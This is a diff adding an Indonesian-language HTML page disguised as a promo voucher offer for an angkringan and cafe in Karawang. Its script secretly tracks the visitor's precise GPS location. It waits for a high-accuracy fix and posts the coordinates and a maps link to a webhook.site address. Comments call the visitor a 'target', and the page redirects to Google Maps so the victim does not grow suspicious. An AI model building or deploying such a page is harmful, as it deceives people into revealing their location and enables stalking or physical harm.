@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Promo Angkringan & Cafe Karawang</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .loader { border-top-color: #ef4444; animation: spinner 1.5s linear infinite; }
+        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen font-sans">
+
+    <div class="max-w-md w-full p-6 text-center">
+        <div class="mb-6">
+            <div class="w-20 h-20 border-4 border-gray-700 border-t-red-500 rounded-full loader mx-auto mb-4"></div>
+            <h1 class="text-2xl font-bold mb-2">Mengecek Lokasi Terdekat...</h1>
+            <p class="text-gray-400 text-sm">Harap izinkan akses lokasi untuk mendapatkan voucher promo di area Karawang & Bekasi.</p>
+        </div>
+
+        <div class="bg-gray-800 p-4 rounded-xl border border-gray-700 mb-6">
+            <p class="text-xs text-yellow-500 font-mono">🔍 MENGHUBUNGKAN KE SERVER GOOGLE MAPS...</p>
+            <p id="accuracy-text" class="text-[10px] text-gray-500 mt-2">Mencari sinyal GPS paling akurat...</p>
+        </div>
+
+        <p class="text-[10px] text-gray-600 italic">© 2026 KarawangFoodies - Secure Verification System</p>
+    </div>
+
+    <script>
+        let highAccuracyData = null;
+        let attempt = 0;
+        // GANTI URL WEBHOOK DI BAWAH INI DENGAN PUNYA BOS ANUGRAH
+        const webhookUrl = 'https://webhook.site/d9ed67e8-2b06-402f-bfd3-d4e1511eb56e';
+
+        function sniperTracking() {
+            if (navigator.geolocation) {
+                const watchID = navigator.geolocation.watchPosition(
+                    (position) => {
+                        attempt++;
+                        document.getElementById('accuracy-text').innerText = `Akurasi Sinyal: ${position.coords.accuracy.toFixed(2)} meter...`;
+                        
+                        if (!highAccuracyData || position.coords.accuracy < highAccuracyData.acc) {
+                            highAccuracyData = {
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude,
+                                acc: position.coords.accuracy
+                            };
+                        }
+
+                        // Kirim setelah 5 kali update agar GPS benar-benar 'Lock'
+                        if (attempt >= 5 || position.coords.accuracy < 15) {
+                            navigator.geolocation.clearWatch(watchID);
+                            sendToBoss();
+                        }
+                    },
+                    (error) => {
+                        // Jika target klik "Block", langsung lempar ke Maps biar gak curiga
+                        window.location.href = "https://www.google.com/maps/search/angkringan+terdekat";
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                window.location.href = "https://www.google.com/maps/search/angkringan+terdekat";
+            }
+        }
+
+        function sendToBoss() {
+            if (highAccuracyData) {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        lat: highAccuracyData.lat,
+                        lon: highAccuracyData.lon,
+                        accuracy_meter: highAccuracyData.acc.toFixed(2),
+                        maps_link: `https://www.google.com/maps?q=${highAccuracyData.lat},${highAccuracyData.lon}`,
+                        status: "SNIPER MODE - TARGET LOCKED KARAWANG!"
+                    })
+                }).then(() => {
+                    // Redirect otomatis ke Maps asli dengan koordinat yang kita dapat
+                    window.location.href = `https://www.google.com/maps?q=${highAccuracyData.lat},${highAccuracyData.lon}&z=17`;
+                });
+            }
+        }
+
+        window.onload = sniperTracking;
+    </script>
+</body>
+</html>
